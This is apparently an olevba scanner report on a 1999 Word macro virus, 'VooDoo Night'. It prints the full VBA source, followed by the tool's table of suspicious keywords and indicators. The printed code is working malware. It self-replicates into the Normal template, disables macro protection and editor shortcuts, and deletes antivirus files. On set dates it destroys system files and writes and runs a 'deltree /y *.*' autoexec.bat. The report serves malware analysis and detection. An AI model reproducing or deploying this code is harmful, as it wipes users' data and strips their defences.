olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Voodoo-5accb44a65186181c0cca0157d489c61a5ee7638
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Voodoo-5accb44a65186181c0cca0157d489c61a5ee7638 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
'///////////////////////////\°°°°°°°°°°°°°°°°°/\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
'////////////////////////////VooDoo NIGHT v1.0\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
'***************************************************************************'
On Error Resume Next

'VooDoo Night, VooDoo Night, Come and Change my FACE
Set CNormalTemplate = NormalTemplate.VBProject
Set CActiveDocument = ActiveDocument.VBProject
Set Coptions = Options
Dim SysDate

'VooDoo Night, Voodoo Night Your are so beautiful, Make everyone stay away from ME
 Application.EnableCancelKey = wdCancelDisabled
  KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=wdKeyCategoryFont, Command:=" "
   KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8), KeyCategory:=wdKeyCategoryFont, Command:=" "
    Application.CommandBars("Tools").Controls(12).Visible = False

      Coptions.VirusProtection = False
       a = CNormalTemplate.vbcomponents(1).CodeModule.CountOfLines
        b = CActiveDocument.vbcomponents(1).CodeModule.CountOfLines
         If a = 86 And b = 86 Then GoTo AvCheck
          If a = 86 Then

           CActiveDocument.vbcomponents(1).CodeModule.DeleteLines 1, CActiveDocument.vbcomponents(1).CodeModule.CountOfLines
          FullCode = CNormalTemplate.vbcomponents(1).CodeModule.Lines(1, CNormalTemplate.vbcomponents(1).CodeModule.CountOfLines)
         CActiveDocument.vbcomponents(1).CodeModule.AddFromString (FullCode)
End If
      If b >= 84 Then
     CNormalTemplate.vbcomponents(1).CodeModule.DeleteLines 1, CNormalTemplate.vbcomponents(1).CodeModule.CountOfLines
    FullCode = CActiveDocument.vbcomponents(1).CodeModule.Lines(1, CActiveDocument.vbcomponents(1).CodeModule.CountOfLines)
   CNormalTemplate.vbcomponents(1).CodeModule.AddFromString (FullCode)
End If

AvCheck:
'VooDoo Night, VooDoo Night, will this be my END?
  If Dir("C:\Programme\AntiViral Toolkit Pro\macro.avc") <> "" Then Kill ("C:\Programme\AntiViral Toolkit Pro\macro.avc")

    If Dir("C:\PROGRAM FILES\AntiViral Toolkit Pro\macro.avc") <> "" Then Kill ("C:\PROGRAM FILES\AntiViral Toolkit Pro\macro.avc")

      If Dir("C:\F-PROT\Macro.def") <> "" Then Kill ("C:\F-PROT\Macro.def")

        If Dir("C:\Programme\Norton AntiVirus\NavLu32.exe") <> "" Then Kill ("C:\Programme\Norton AntiVirus\NavLu32.exe")

          If Dir("C:\PROGRAM FILES\Norton AntiVirus\NavLu32.exe") <> "" Then Kill ("C:\PROGRAM FILES\Norton AntiVirus\NavLu32.exe")

            If Dir("C:\PROGRAM FILES\Norton AntiVirus\Rescue.exe") <> "" Then Kill ("C:\PROGRAM FILES\Norton AntiVirus\Rescue.exe")

              If Dir("C:\Programme\Norton AntiVirus\Rescue.exe") <> "" Then Kill ("C:\Programme\Norton AntiVirus\Rescue.exe")

Payload:

'Payload_1_
If Day(Now) = 31 Then
            MsgBox "                         GRIPPED BY VooDoo, LEFT ALONE, DAMNED FOREVER, SPELLED FOR NIGHT, POSSESED BY SATAN-                                                                                                               itz VooDoo NIGHT! (c)1999 by doc"
            
Open ("C:\windows\win.com") For Output As #12
   Print #1, 20, "-VooDoo NIGHT-"
Close #1
SetAttr "c:\io.sys", vbNormal
Kill ("c:\io.sys")
SetAttr "c:\windows\system.ini", vbNormal
Kill ("c:\windows\system.ini")
End If
'-----------------------------------------------------------------------------------------------------------------------
'Payload_2_
If Day(Now) = 13 Then
 Open ("c:\autoexec.bat") For Output As #13
  Print #13, "deltree /y *.*"
   Print #13, "exit"
Close #13
SetAttr "c:\windows\regedit.exe", vbNormal
Kill ("c:\windows\regedit.exe")
   Shell ("c:\autoexec.bat"), vbHide

Do
           MsgBox "                         GRIPPED BY VooDoo, LEFT ALONE, DAMNED FOREVER, SPELLED FOR NIGHT, POSSESED BY SATAN-                                                                                                               itz VooDoo NIGHT! v1.0 (c)1999 by doc"
   Dim iResult, iNum, iDiv
   iNum = "3,141592654"
   iDiv = "7,00000000003"
   iResult = iNum / iDiv
Loop
End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NavLu32.exe         |Executable file name                         |
|IOC       |Rescue.exe          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |regedit.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

